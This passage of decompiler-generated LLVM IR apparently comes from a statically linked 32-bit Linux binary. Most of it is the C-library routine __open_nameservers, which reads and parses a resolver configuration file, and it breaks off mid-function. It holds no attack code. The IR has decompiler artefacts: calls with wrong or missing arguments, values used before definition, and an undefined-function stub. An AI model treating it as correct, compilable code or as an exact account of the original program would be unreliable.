  br i1 %v4_804e025, label %dec_label_pc_804e047, label %dec_label_pc_804e029

dec_label_pc_804e047:                             ; preds = %dec_label_pc_804e044, %dec_label_pc_804e029, %dec_label_pc_804e037, %dec_label_pc_804e03f, %entry
  %v0_804e047 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e049 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e049, i32* @ebx, align 4
  ret i32 %v0_804e047

; uselistorder directives
  uselistorder i32 %v3_804e023, { 1, 0 }
  uselistorder i8* %v1_804e023, { 1, 0 }
  uselistorder i32 %v1_804e044, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804e047, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_804e029, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-524 = alloca i32, align 4
  %v15_804e04f = ptrtoint i32* %stack_var_-524 to i32
  %v0_804e055 = load i32, i32* @global_var_8055b90.112, align 16
  %v1_804e055 = icmp eq i32 %v0_804e055, 0
  %v1_804e05c = icmp eq i1 %v1_804e055, false
  br i1 %v1_804e05c, label %dec_label_pc_804e09a, label %dec_label_pc_804e05e

dec_label_pc_804e05e:                             ; preds = %entry
  %v2_804e05e = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804e05e, i32* %eax.global-to-local, align 4
  %v4_804e06b = call i32 @__GI_stat(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80512c1.113, i32 0, i32 0), i32 %v2_804e05e)
  store i32 ptrtoint ([17 x i8]* @global_var_80512c1.113 to i32), i32* @edi, align 4
  store i32 %v2_804e05e, i32* @ebp, align 4
  %v1_804e072 = icmp eq i32 %v4_804e06b, 0
  %. = select i1 %v1_804e072, i32 %tmp20, i32 0
  store i32 %., i32* @eax, align 4
  %v0_804e088 = load i32, i32* @global_var_80557f0.114, align 16
  %v12_804e088 = icmp eq i32 %v0_804e088, %.
  br i1 %v12_804e088, label %dec_label_pc_804e09a, label %dec_label_pc_804e090

dec_label_pc_804e090:                             ; preds = %dec_label_pc_804e05e
  store i32 %., i32* @global_var_80557f0.114, align 16
  %v0_804e095 = call i32 @__close_nameservers()
  store i32 %v0_804e095, i32* @eax, align 4
  br label %dec_label_pc_804e09a

dec_label_pc_804e09a:                             ; preds = %dec_label_pc_804e05e, %entry, %dec_label_pc_804e090
  %v0_804e09a = load i64, i64* @global_var_8055b9c.109, align 8
  %v1_804e09a = trunc i64 %v0_804e09a to i32
  %v2_804e09a = icmp eq i32 %v1_804e09a, 0
  %v1_804e0a1 = icmp eq i1 %v2_804e09a, false
  br i1 %v1_804e0a1, label %dec_label_pc_804e3a1, label %dec_label_pc_804e0a7

dec_label_pc_804e0a7:                             ; preds = %dec_label_pc_804e09a
  store i8 5, i8* bitcast (i64* @global_var_8053584.111 to i8*), align 8
  store i8 3, i8* bitcast (i8** @global_var_8053585.108 to i8*), align 4
  %v3_804e0bf = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_80512c1.113 to i32), i32 ptrtoint (i32* @global_var_80512db.91 to i32))
  store i32 %v3_804e0bf, i32* %eax.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_80512c1.113 to i32), i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_80512db.91 to i32), i32* @esi, align 4
  %v1_804e0ca = icmp eq i32 %v3_804e0bf, 0
  %v1_804e0cc = icmp eq i1 %v1_804e0ca, false
  br i1 %v1_804e0cc, label %dec_label_pc_804e2c9, label %dec_label_pc_804e2fe

dec_label_pc_804e0d7:                             ; preds = %dec_label_pc_804e2d3
  %v1_804e0d7 = add i32 %v0_804e2e9, 276
  store i32 %v1_804e0d7, i32* @eax, align 4
  %v0_804e0de = call i32 @skip_and_NUL_space()
  store i32 %v0_804e0de, i32* @eax, align 4
  store i32 %v0_804e0de, i32* @esi, align 4
  %v0_804e0e5 = call i32 @skip_nospace()
  store i32 %v0_804e0e5, i32* @eax, align 4
  %v0_804e0ea = call i32 @skip_and_NUL_space()
  store i32 %v0_804e0ea, i32* @eax, align 4
  store i32 %v0_804e0ea, i32* @ebp, align 4
  %v0_804e0f1 = load i32, i32* @esp, align 4
  %v1_804e0f1 = add i32 %v0_804e0f1, -4
  %v2_804e0f1 = inttoptr i32 %v1_804e0f1 to i32*
  store i32 ptrtoint ([11 x i8]* @global_var_80512d2.115 to i32), i32* %v2_804e0f1, align 4
  %v0_804e0f6 = load i32, i32* @esi, align 4
  %v2_804e0f6 = add i32 %v0_804e0f1, -8
  %v3_804e0f6 = inttoptr i32 %v2_804e0f6 to i32*
  store i32 %v0_804e0f6, i32* %v3_804e0f6, align 4
  %v3_804e0f7 = call i32 @__GI_strcoll(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e0f7, i32* @eax, align 4
  %v0_804e0fc = load i32, i32* @esp, align 4
  %v3_804e0fc = add i32 %v0_804e0fc, 4
  %v1_804e0fd = inttoptr i32 %v3_804e0fc to i32*
  %v2_804e0fd = load i32, i32* %v1_804e0fd, align 4
  store i32 %v2_804e0fd, i32* @ecx, align 4
  store i32 %v3_804e0f7, i32* @ebx, align 4
  %v1_804e100 = icmp eq i32 %v3_804e0f7, 0
  %v1_804e102 = icmp eq i1 %v1_804e100, false
  br i1 %v1_804e102, label %dec_label_pc_804e1c0, label %dec_label_pc_804e108

dec_label_pc_804e108:                             ; preds = %dec_label_pc_804e0d7
  %v0_804e108 = load i32, i32* @ebp, align 4
  store i32 %v0_804e108, i32* @eax, align 4
  %v0_804e10a = call i32 @skip_nospace()
  %v1_804e10a = inttoptr i32 %v0_804e10a to i8*
  store i32 %v0_804e10a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v1_804e10a, align 1
  %v0_804e117 = load i32, i32* @esp, align 4
  %v1_804e117 = inttoptr i32 %v0_804e117 to i32*
  %v2_804e117 = load i32, i32* %v1_804e117, align 4
  %v3_804e117 = inttoptr i32 %v2_804e117 to i8*
  store i32 %v2_804e117, i32* @edi, align 4
  %v0_804e11a = load i32, i32* @ebx, align 4
  store i32 %v0_804e11a, i32* %eax.global-to-local, align 4
  %v5_804e11c = call i8* @_memset(i8* %v3_804e117, i32 %v0_804e11a, i32 7)
  %v6_804e11c = ptrtoint i8* %v5_804e11c to i32
  store i32 %v6_804e11c, i32* @ecx, align 4
  %v0_804e11e = load i32, i32* @esp, align 4
  %v1_804e11e = add i32 %v0_804e11e, 488
  store i32 %v1_804e11e, i32* %eax.global-to-local, align 4
  %v2_804e125 = add i32 %v0_804e11e, -4
  %v3_804e125 = inttoptr i32 %v2_804e125 to i32*
  store i32 %v1_804e11e, i32* %v3_804e125, align 4
  %v0_804e126 = load i32, i32* @ebp, align 4
  %v2_804e126 = add i32 %v0_804e11e, -8
  %v3_804e126 = inttoptr i32 %v2_804e126 to i32*
  store i32 %v0_804e126, i32* %v3_804e126, align 4
  %v1_804e127 = add i32 %v0_804e11e, -12
  %v2_804e127 = inttoptr i32 %v1_804e127 to i32*
  store i32 10, i32* %v2_804e127, align 4
  %v3_804e129 = call i32 @inet_pton(i32 %v3_804e0bf, i8* bitcast (i32* @0 to i8*))
  store i32 %v3_804e129, i32* %eax.global-to-local, align 4
  %v0_804e12e = load i32, i32* @esp, align 4
  %tmp30 = icmp slt i32 %v3_804e129, 1
  br i1 %tmp30, label %dec_label_pc_804e141, label %dec_label_pc_804e135

dec_label_pc_804e135:                             ; preds = %dec_label_pc_804e108
  %v1_804e135 = add i32 %v0_804e12e, 492
  %v2_804e135 = inttoptr i32 %v1_804e135 to i16*
  store i16 10, i16* %v2_804e135, align 2
  br label %dec_label_pc_804e166

dec_label_pc_804e141:                             ; preds = %dec_label_pc_804e108
  %v1_804e141 = add i32 %v0_804e12e, 496
  store i32 %v1_804e141, i32* %eax.global-to-local, align 4
  %v2_804e148 = add i32 %v0_804e12e, 8
  %v3_804e148 = inttoptr i32 %v2_804e148 to i32*
  store i32 %v1_804e141, i32* %v3_804e148, align 4
  %v0_804e149 = load i32, i32* @ebp, align 4
  %v2_804e149 = add i32 %v0_804e12e, 4
  %v3_804e149 = inttoptr i32 %v2_804e149 to i32*
  store i32 %v0_804e149, i32* %v3_804e149, align 4
  %v2_804e14a = inttoptr i32 %v0_804e12e to i32*
  store i32 2, i32* %v2_804e14a, align 4
  %v3_804e14c = call i32 @inet_pton(i32 %v3_804e0bf, i8* bitcast (i32* @0 to i8*))
  store i32 %v3_804e14c, i32* @eax, align 4
  %tmp31 = icmp slt i32 %v3_804e14c, 1
  br i1 %tmp31, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e15c

dec_label_pc_804e15c:                             ; preds = %dec_label_pc_804e141
  %v0_804e151 = load i32, i32* @esp, align 4
  %v1_804e15c = add i32 %v0_804e151, 492
  %v2_804e15c = inttoptr i32 %v1_804e15c to i16*
  store i16 2, i16* %v2_804e15c, align 2
  br label %dec_label_pc_804e166

dec_label_pc_804e166:                             ; preds = %dec_label_pc_804e135, %dec_label_pc_804e15c
  %v0_804e166 = load i32, i32* @esp, align 4
  %v1_804e166 = add i32 %v0_804e166, 482
  %v2_804e166 = inttoptr i32 %v1_804e166 to i16*
  store i16 13568, i16* %v2_804e166, align 2
  %v0_804e170 = load i64, i64* @global_var_8055b9c.109, align 8
  %v1_804e170 = trunc i64 %v0_804e170 to i32
  %tmp = mul i32 %v1_804e170, 28
  %v3_804e176 = add i32 %tmp, 28
  store i32 %v3_804e176, i32* %eax.global-to-local, align 4
  %v1_804e179 = load i32, i32* @esp, align 4
  %v2_804e179 = add i32 %v1_804e179, -4
  %v3_804e179 = inttoptr i32 %v2_804e179 to i32*
  store i32 %v3_804e176, i32* %v3_804e179, align 4
  %v0_804e17a = load i32, i32* @global_var_8055b98.110, align 8
  %v2_804e17a = add i32 %v1_804e179, -8
  %v3_804e17a = inttoptr i32 %v2_804e17a to i32*
  store i32 %v0_804e17a, i32* %v3_804e17a, align 4
  %v0_804e180 = call i32 @realloc()
  store i32 %v0_804e180, i32* @eax, align 4
  %v0_804e187 = load i32, i32* @esp, align 4
  %v1_804e187 = inttoptr i32 %v0_804e187 to i32*
  %v2_804e187 = load i32, i32* %v1_804e187, align 4
  store i32 %v2_804e187, i32* @esi, align 4
  %v3_804e187 = add i32 %v0_804e187, 4
  %v1_804e188 = inttoptr i32 %v3_804e187 to i32*
  %v2_804e188 = load i32, i32* %v1_804e188, align 4
  store i32 %v2_804e188, i32* @edi, align 4
  %v1_804e189 = icmp eq i32 %v0_804e180, 0
  br i1 %v1_804e189, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e191

dec_label_pc_804e191:                             ; preds = %dec_label_pc_804e166
  store i32 %v0_804e180, i32* @global_var_8055b98.110, align 8
  %v0_804e196 = load i64, i64* @global_var_8055b9c.109, align 8
  %v1_804e196 = trunc i64 %v0_804e196 to i32
  store i32 %v1_804e196, i32* %ebx.global-to-local, align 4
  %v3_804e19c = mul i32 %v1_804e196, 28
  %v2_804e19f = add i32 %v3_804e19c, %v0_804e180
  store i32 %v2_804e19f, i32* %eax.global-to-local, align 4
  store i32 28, i32* %v1_804e188, align 4
  %v1_804e1a3 = add i32 %v0_804e187, 488
  store i32 %v1_804e1a3, i32* %v1_804e187, align 4
  %v0_804e1ab = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1ab = add i32 %v0_804e187, -4
  %v3_804e1ab = inttoptr i32 %v2_804e1ab to i32*
  store i32 %v0_804e1ab, i32* %v3_804e1ab, align 4
  %v4_804e1ac = call i32 @memcpy(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e1ac, i32* @eax, align 4
  %v0_804e1b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1b1 = add i32 %v0_804e1b1, 1
  store i32 %v1_804e1b1, i32* @ebx, align 4
  %v1_804e1b2 = sext i32 %v1_804e1b1 to i64
  store i64 %v1_804e1b2, i64* @global_var_8055b9c.109, align 8
  br label %dec_label_pc_804e2d3.backedge

dec_label_pc_804e1c0:                             ; preds = %dec_label_pc_804e0d7
  %v1_804e0fc = inttoptr i32 %v0_804e0fc to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_80512dd.116 to i32), i32* %v1_804e0fd, align 4
  %v0_804e1c5 = load i32, i32* @esi, align 4
  store i32 %v0_804e1c5, i32* %v1_804e0fc, align 4
  %v3_804e1c6 = call i32 @__GI_strcoll(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e1c6, i32* @eax, align 4
  %v0_804e1cb = load i32, i32* @esp, align 4
  %v1_804e1cb = inttoptr i32 %v0_804e1cb to i32*
  %v2_804e1cb = load i32, i32* %v1_804e1cb, align 4
  store i32 %v2_804e1cb, i32* @ecx, align 4
  %v3_804e1cb = add i32 %v0_804e1cb, 4
  %v1_804e1cc = inttoptr i32 %v3_804e1cb to i32*
  %v2_804e1cc = load i32, i32* %v1_804e1cc, align 4
  store i32 %v2_804e1cc, i32* @ebx, align 4
  %v1_804e1cd = icmp eq i32 %v3_804e1c6, 0
  br i1 %v1_804e1cd, label %dec_label_pc_804e1fe.preheader, label %dec_label_pc_804e1d1

dec_label_pc_804e1d1:                             ; preds = %dec_label_pc_804e1c0
  store i32 ptrtoint ([7 x i8]* @global_var_80512e4.117 to i32), i32* %v1_804e1cc, align 4
  %v0_804e1d6 = load i32, i32* @esi, align 4
  store i32 %v0_804e1d6, i32* %v1_804e1cb, align 4
  %v3_804e1d7 = call i32 @__GI_strcoll(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e1d7, i32* @eax, align 4
  %v0_804e1dc = load i32, i32* @esp, align 4
  %v1_804e1dc = inttoptr i32 %v0_804e1dc to i32*
  %v2_804e1dc = load i32, i32* %v1_804e1dc, align 4
  store i32 %v2_804e1dc, i32* @edi, align 4
  %v1_804e1de = icmp eq i32 %v3_804e1d7, 0
  br i1 %v1_804e1de, label %dec_label_pc_804e1fe.preheader, label %dec_label_pc_804e267

dec_label_pc_804e1fe.preheader:                   ; preds = %dec_label_pc_804e1c0, %dec_label_pc_804e1d1
  %v6_804e1f516.in = phi i32 [ %v0_804e1cb, %dec_label_pc_804e1c0 ], [ %v0_804e1dc, %dec_label_pc_804e1d1 ]
  %v6_804e1f516 = add i32 %v6_804e1f516.in, 8
  %v0_804e1fe3 = load i32, i32* @global_var_8055ba0.104, align 32
  store i32 %v0_804e1fe3, i32* %eax.global-to-local, align 4
  %v1_804e2034 = icmp eq i32 %v0_804e1fe3, 0
  %v1_804e20511 = icmp eq i1 %v1_804e2034, false
  br i1 %v1_804e20511, label %dec_label_pc_804e1e7, label %dec_label_pc_804e207.preheader

dec_label_pc_804e1e7:                             ; preds = %dec_label_pc_804e1fe.preheader, %dec_label_pc_804e1e7
  %v6_804e1f5 = phi i32 [ %v3_804e1fd, %dec_label_pc_804e1e7 ], [ %v6_804e1f516, %dec_label_pc_804e1fe.preheader ]
  %v0_804e1fe12 = phi i32 [ %v0_804e1fe, %dec_label_pc_804e1e7 ], [ %v0_804e1fe3, %dec_label_pc_804e1fe.preheader ]
  %v1_804e1e7 = add i32 %v0_804e1fe12, -1
  store i32 %v1_804e1e7, i32* @global_var_8055ba0.104, align 32
  %v0_804e1f0 = load i32, i32* @global_var_8055b94.105, align 4
  store i32 %v0_804e1f0, i32* %eax.global-to-local, align 4
  %v2_804e1f5 = mul i32 %v1_804e1e7, 4
  %v3_804e1f5 = add i32 %v0_804e1f0, %v2_804e1f5
  %v4_804e1f5 = inttoptr i32 %v3_804e1f5 to i32*
  %v5_804e1f5 = load i32, i32* %v4_804e1f5, align 4
  %v7_804e1f5 = add i32 %v6_804e1f5, -4
  %v8_804e1f5 = inttoptr i32 %v7_804e1f5 to i32*
  store i32 %v5_804e1f5, i32* %v8_804e1f5, align 4
  %v1_804e1f8 = call i32 @free(i32 %v3_804e0bf)
  store i32 %v1_804e1f8, i32* %eax.global-to-local, align 4
  %v0_804e1fd = load i32, i32* @esp, align 4
  %v1_804e1fd = inttoptr i32 %v0_804e1fd to i32*
  %v2_804e1fd = load i32, i32* %v1_804e1fd, align 4
  store i32 %v2_804e1fd, i32* @ebx, align 4
  %v3_804e1fd = add i32 %v0_804e1fd, 4
  %v0_804e1fe = load i32, i32* @global_var_8055ba0.104, align 32
  store i32 %v0_804e1fe, i32* %eax.global-to-local, align 4
  %v1_804e203 = icmp eq i32 %v0_804e1fe, 0
  %v1_804e205 = icmp eq i1 %v1_804e203, false
  br i1 %v1_804e205, label %dec_label_pc_804e1e7, label %dec_label_pc_804e207.preheader

dec_label_pc_804e207.preheader:                   ; preds = %dec_label_pc_804e1e7, %dec_label_pc_804e1fe.preheader
  %v0_804e207.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e207

dec_label_pc_804e207:                             ; preds = %dec_label_pc_804e207.preheader, %dec_label_pc_804e24a
  %v0_804e207 = phi i32 [ %v0_804e207.pre, %dec_label_pc_804e207.preheader ], [ %v0_804e25e, %dec_label_pc_804e24a ]
  store i32 %v0_804e207, i32* @eax, align 4
  %v0_804e209 = call i32 @skip_nospace()
  store i32 %v0_804e209, i32* @eax, align 4
  %v0_804e20e = call i32 @skip_and_NUL_space()
  store i32 %v0_804e20e, i32* @ebx, align 4
  %v0_804e215 = load i32, i32* @global_var_8055ba0.104, align 32
  %v1_804e21a = mul i32 %v0_804e215, 4
  %v2_804e21b = add i32 %v1_804e21a, 4
  store i32 %v2_804e21b, i32* %eax.global-to-local, align 4
  %v1_804e21e = load i32, i32* @esp, align 4
  %v2_804e21e = add i32 %v1_804e21e, -4
  %v3_804e21e = inttoptr i32 %v2_804e21e to i32*
  store i32 %v2_804e21b, i32* %v3_804e21e, align 4
  %v0_804e21f = load i32, i32* @global_var_8055b94.105, align 4
  %v2_804e21f = add i32 %v1_804e21e, -8
  %v3_804e21f = inttoptr i32 %v2_804e21f to i32*
  store i32 %v0_804e21f, i32* %v3_804e21f, align 4
  %v0_804e225 = call i32 @realloc()
  store i32 %v0_804e225, i32* @eax, align 4
  %v0_804e22a = load i32, i32* @esp, align 4
  %v3_804e22a = add i32 %v0_804e22a, 4
  %v1_804e22b = inttoptr i32 %v3_804e22a to i32*
  %v2_804e22b = load i32, i32* %v1_804e22b, align 4
  store i32 %v2_804e22b, i32* @ecx, align 4
  %v1_804e22c = icmp eq i32 %v0_804e225, 0
  br i1 %v1_804e22c, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e234

dec_label_pc_804e234:                             ; preds = %dec_label_pc_804e207
  store i32 %v0_804e225, i32* @global_var_8055b94.105, align 4
  %v0_804e239 = load i32, i32* @ebp, align 4
  store i32 %v0_804e239, i32* %v1_804e22b, align 4
  %v0_804e23a = call i32 @__GI_strdup()
  store i32 %v0_804e23a, i32* @eax, align 4
  store i32 %v0_804e23a, i32* @ecx, align 4
  %v0_804e241 = load i32, i32* @esp, align 4
  %v1_804e241 = inttoptr i32 %v0_804e241 to i32*
  %v2_804e241 = load i32, i32* %v1_804e241, align 4
  store i32 %v2_804e241, i32* @ebp, align 4
  %v1_804e242 = icmp eq i32 %v0_804e23a, 0
  br i1 %v1_804e242, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e234
  %v0_804e24a = load i32, i32* @global_var_8055ba0.104, align 32
  store i32 %v0_804e24a, i32* %eax.global-to-local, align 4
  %v0_804e24f = load i32, i32* @global_var_8055b94.105, align 4
  %v3_804e255 = mul i32 %v0_804e24a, 4
  %v4_804e255 = add i32 %v0_804e24f, %v3_804e255
  %v5_804e255 = inttoptr i32 %v4_804e255 to i32*
  store i32 %v0_804e23a, i32* %v5_804e255, align 4
  %v0_804e258 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e258 = add i32 %v0_804e258, 1
  store i32 %v1_804e258, i32* @eax, align 4
  store i32 %v1_804e258, i32* @global_var_8055ba0.104, align 32
  %v0_804e25e = load i32, i32* @ebx, align 4
  store i32 %v0_804e25e, i32* @ebp, align 4
  %v1_804e260 = inttoptr i32 %v0_804e25e to i8*
  %v2_804e260 = load i8, i8* %v1_804e260, align 1
  %v3_804e260 = icmp eq i8 %v2_804e260, 0
  br i1 %v3_804e260, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e207

dec_label_pc_804e267:                             ; preds = %dec_label_pc_804e1d1
  %v3_804e1dc = add i32 %v0_804e1dc, 4
  %v1_804e1dd = inttoptr i32 %v3_804e1dc to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80512eb.118 to i32), i32* %v1_804e1dd, align 4
  %v0_804e26c = load i32, i32* @esi, align 4
  store i32 %v0_804e26c, i32* %v1_804e1dc, align 4
  %v3_804e26d = call i32 @__GI_strcoll(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e26d, i32* @eax, align 4
  %v0_804e272 = load i32, i32* @esp, align 4
  %v1_804e272 = inttoptr i32 %v0_804e272 to i32*
  %v2_804e272 = load i32, i32* %v1_804e272, align 4
  store i32 %v2_804e272, i32* @esi, align 4
  %v3_804e272 = add i32 %v0_804e272, 4
  %v1_804e273 = inttoptr i32 %v3_804e272 to i32*
  %v2_804e273 = load i32, i32* %v1_804e273, align 4
  store i32 %v2_804e273, i32* @edi, align 4
  %v1_804e274 = icmp eq i32 %v3_804e26d, 0
  %v1_804e276 = icmp eq i1 %v1_804e274, false
  br i1 %v1_804e276, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e278

dec_label_pc_804e278:                             ; preds = %dec_label_pc_804e267
  %v0_804e278 = load i32, i32* @ebp, align 4
  %v1_804e278 = icmp eq i32 %v0_804e278, 0
  br i1 %v1_804e278, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e27c

dec_label_pc_804e27c:                             ; preds = %dec_label_pc_804e278
  store i32 58, i32* %v1_804e273, align 4
  %v0_804e27e = load i32, i32* @ebp, align 4
  store i32 %v0_804e27e, i32* %v1_804e272, align 4
  %v3_804e27f = call i32 @__GI_strchr(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e27f, i32* @eax, align 4
  %v0_804e284 = load i32, i32* @esp, align 4
  %v1_804e284 = inttoptr i32 %v0_804e284 to i32*
  %v2_804e284 = load i32, i32* %v1_804e284, align 4
  store i32 %v2_804e284, i32* @ecx, align 4
  store i32 %v3_804e27f, i32* @ebx, align 4
  %v2_804e288 = icmp eq i32 %v3_804e27f, 0
  br i1 %v2_804e288, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e28c

dec_label_pc_804e28c:                             ; preds = %dec_label_pc_804e27c
  %v4_804e27f = inttoptr i32 %v3_804e27f to i8*
  store i8 0, i8* %v4_804e27f, align 1
  %v0_804e28f = load i32, i32* @esp, align 4
  %v1_804e28f = add i32 %v0_804e28f, -4
  %v2_804e28f = inttoptr i32 %v1_804e28f to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80512f3.119 to i32), i32* %v2_804e28f, align 4
  %v0_804e294 = load i32, i32* @ebp, align 4
  %v2_804e294 = add i32 %v0_804e28f, -8
  %v3_804e294 = inttoptr i32 %v2_804e294 to i32*
  store i32 %v0_804e294, i32* %v3_804e294, align 4
  %v3_804e295 = call i32 @__GI_strcoll(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e295, i32* @eax, align 4
  %v0_804e29a = load i32, i32* @esp, align 4
  %v1_804e29a = inttoptr i32 %v0_804e29a to i32*
  %v2_804e29a = load i32, i32* %v1_804e29a, align 4
  store i32 %v2_804e29a, i32* @edi, align 4
  store i32 ptrtoint (i64* @global_var_8053584.111 to i32), i32* @esi, align 4
  %v1_804e2a1 = icmp eq i32 %v3_804e295, 0
  br i1 %v1_804e2a1, label %dec_label_pc_804e2bb, label %dec_label_pc_804e2a5

dec_label_pc_804e2a5:                             ; preds = %dec_label_pc_804e28c
  %v3_804e29a = add i32 %v0_804e29a, 4
  %v1_804e29b = inttoptr i32 %v3_804e29a to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80512fb.120 to i32), i32* %v1_804e29b, align 4
  %v0_804e2aa = load i32, i32* @ebp, align 4
  store i32 %v0_804e2aa, i32* %v1_804e29a, align 4
  %v3_804e2ab = call i32 @__GI_strcoll(i8* %v2_804e0f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e2ab, i32* @eax, align 4
  %v0_804e2b0 = load i32, i32* @esp, align 4
  %v1_804e2b0 = inttoptr i32 %v0_804e2b0 to i32*
  %v2_804e2b0 = load i32, i32* %v1_804e2b0, align 4
  store i32 %v2_804e2b0, i32* @ecx, align 4
  %v3_804e2b0 = add i32 %v0_804e2b0, 4
  %v1_804e2b1 = inttoptr i32 %v3_804e2b0 to i32*
  %v2_804e2b1 = load i32, i32* %v1_804e2b1, align 4
  store i32 %v2_804e2b1, i32* @esi, align 4
  %v1_804e2b2 = icmp eq i32 %v3_804e2ab, 0
  %v1_804e2b4 = icmp eq i1 %v1_804e2b2, false
  br i1 %v1_804e2b4, label %dec_label_pc_804e2d3.backedge, label %dec_label_pc_804e2b6

dec_label_pc_804e2b6:                             ; preds = %dec_label_pc_804e2a5
  store i32 ptrtoint (i8** @global_var_8053585.108 to i32), i32* @esi, align 4
  br label %dec_label_pc_804e2bb

dec_label_pc_804e2bb:                             ; preds = %dec_label_pc_804e28c, %dec_label_pc_804e2b6
  %v1_804e2be.in = phi i32 [ %v0_804e29a, %dec_label_pc_804e28c ], [ %v0_804e2b0, %dec_label_pc_804e2b6 ]
  %v0_804e2bb = load i32, i32* @ebx, align 4
  %v1_804e2bb = add i32 %v0_804e2bb, 1
  store i32 %v1_804e2bb, i32* %eax.global-to-local, align 4
  %v2_804e2be = add i32 %v1_804e2be.in, 4
  %v3_804e2be = inttoptr i32 %v2_804e2be to i32*
  store i32 %v1_804e2bb, i32* %v3_804e2be, align 4
  %v1_804e2bf = call i32 @atol(i32 %v3_804e0bf)
  %v2_804e2bf = trunc i32 %v1_804e2bf to i8
  store i32 %v1_804e2bf, i32* @eax, align 4
  %v3_804e2c5 = load i32, i32* @esi, align 4
  %v4_804e2c5 = inttoptr i32 %v3_804e2c5 to i8*
  store i8 %v2_804e2bf, i8* %v4_804e2c5, align 1
  br label %dec_label_pc_804e2d3.backedge

dec_label_pc_804e2d3.backedge:                    ; preds = %dec_label_pc_804e24a, %dec_label_pc_804e234, %dec_label_pc_804e207, %dec_label_pc_804e2bb, %dec_label_pc_804e191, %dec_label_pc_804e141, %dec_label_pc_804e166, %dec_label_pc_804e267, %dec_label_pc_804e278, %dec_label_pc_804e27c, %dec_label_pc_804e2a5
  %v0_804e2d3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e2d3

dec_label_pc_804e2c9:                             ; preds = %dec_label_pc_804e0a7
  %v2_804e2c9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804e2c9, i32* @eax, align 4
  store i32 %v2_804e2c9, i32* %stack_var_-524, align 4
  %v2_804e0f7 = inttoptr i32 %v3_804e0bf to i8*
  br label %dec_label_pc_804e2d3

dec_label_pc_804e2d3:                             ; preds = %dec_label_pc_804e2d3.backedge, %dec_label_pc_804e2c9
  %v0_804e2d3 = phi i32 [ %v0_804e2d3.pre, %dec_label_pc_804e2d3.backedge ], [ %v15_804e04f, %dec_label_pc_804e2c9 ]
  %v1_804e2d3 = add i32 %v0_804e2d3, 4
  %v2_804e2d3 = inttoptr i32 %v1_804e2d3 to i32*
  %v3_804e2d3 = load i32, i32* %v2_804e2d3, align 4
  %v5_804e2d3 = add i32 %v0_804e2d3, -4
  %v6_804e2d3 = inttoptr i32 %v5_804e2d3 to i32*
  store i32 %v3_804e2d3, i32* %v6_804e2d3, align 4
  %v1_804e2d7 = add i32 %v0_804e2d3, -8
  %v2_804e2d7 = inttoptr i32 %v1_804e2d7 to i32*
  store i32 128, i32* %v2_804e2d7, align 4
  %v1_804e2dc = add i32 %v0_804e2d3, 264
  store i32 %v1_804e2dc, i32* @edx, align 4
  %v2_804e2e3 = add i32 %v0_804e2d3, -12
  %v3_804e2e3 = inttoptr i32 %v2_804e2e3 to i32*
  store i32 %v1_804e2dc, i32* %v3_804e2e3, align 4
  %v0_804e2e4 = call i32 @fgets()
  store i32 %v0_804e2e4, i32* @eax, align 4
  %v0_804e2e9 = load i32, i32* @esp, align 4
  %v1_804e2ec = icmp eq i32 %v0_804e2e4, 0
  %v1_804e2ee = icmp eq i1 %v1_804e2ec, false
  br i1 %v1_804e2ee, label %dec_label_pc_804e0d7, label %dec_label_pc_804e2f4

dec_label_pc_804e2f4:                             ; preds = %dec_label_pc_804e2d3
  %v1_804e2f4 = add i32 %v0_804e2e9, 16
  %v2_804e2f4 = inttoptr i32 %v1_804e2f4 to i32*
  %v3_804e2f4 = load i32, i32* %v2_804e2f4, align 4
  %v5_804e2f4 = add i32 %v0_804e2e9, 8
  %v6_804e2f4 = inttoptr i32 %v5_804e2f4 to i32*
  store i32 %v3_804e2f4, i32* %v6_804e2f4, align 4
  %v0_804e2f8 = load i32, i32* %stack_var_-524, align 4
  %v2_804e2f8 = inttoptr i32 %v0_804e2f8 to i16*
